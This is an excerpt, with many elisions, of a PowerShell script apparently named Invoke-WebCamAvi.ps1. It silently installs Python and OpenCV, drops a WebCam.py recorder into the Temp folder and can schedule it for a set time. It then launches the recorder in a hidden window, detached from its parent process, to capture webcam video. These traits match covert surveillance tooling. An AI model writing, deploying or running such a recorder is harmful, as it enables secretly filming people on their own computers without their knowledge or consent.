...
.SYNOPSIS
   ...
   Optional Dependencies: opencv-python, winget
...
.NOTES
   ...
   Parameter RecTime accepts values from 10 seconds (minimum) up to 120 seconds (max)
...
.Parameter StartTime
   Start record at selected time (default: off)
...
.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -starttime '20:15'
   Start record at selected -starttime 'HOURS:MINUTS'
...
.OUTPUTS
   ...
   - Creating: C:\Users\pedro\AppData\Local\Temp\WebCam.py
...
If($CheckInstall -iNotMatch '^(Python+\s+\d*)')
{
   ...
   If($ForceInstall.IsPresent)
   {
      ...
      If($available -Match 'Python.Python.3.12')
      {
         ...
         Start-Sleep -Milliseconds 1700 #Give extra time to finish installs
      }
   }
   Else
   {
...
If(-not($OPenCVTest) -or ($OPenCVTest -iNotMatch 'True'))
{
   ...
   If($ForceInstall.IsPresent)
   {
      ...
      echo y|pip install opencv-python --exists-action i --no-warn-conflicts --progress-bar off --quiet
      Start-Sleep -Milliseconds 1700 #Give extra time to finish installs
   }
   Else
   {
...
If($RecTime -gt $RecLimmit -or $RecTime -lt 10)
{
   [int]$RecTime = '15'
   write-host "  x " -ForegroundColor Red -NoNewline
...
If($StartTime -Match '^(\d+\d+:+\d+\d)$')
{
   ...
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Start webcam capture at selected time.
   #>

   write-host "    - " -ForegroundColor Red -NoNewline
   write-host "Schedule recording at: [" -NoNewline
   ...
   while($true)
   {
      ...
      {
         break # Continue Invoke-WebCamAvi execution
      }
...
cd "$WorkingDir"
## Execute WebCam.py detach from parent process [orphan]
Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"

## Capture stop time
[int]$RecTime = $RecTime+3
...
Start-Sleep -Seconds 7 #Give some time to allow avi to finish converting
